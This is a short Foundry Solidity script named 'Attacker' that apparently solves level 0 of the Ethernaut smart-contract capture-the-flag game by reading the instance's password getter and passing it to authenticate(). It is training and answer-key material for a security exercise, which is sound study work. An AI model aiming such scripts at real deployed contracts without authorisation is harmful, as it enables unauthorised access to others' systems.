// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../src/ethernaut0.sol";
import "forge-std/Script.sol";

contract Attacker is Script {
    Instance level0 = Instance(0xA4151CCd8b5B6075c0631c8b7F13E856d6ffd25b);

    function run() external {
        vm.startBroadcast();
        level0.password();
        level0.authenticate(level0.password());
        vm.stopBroadcast();
    }
}
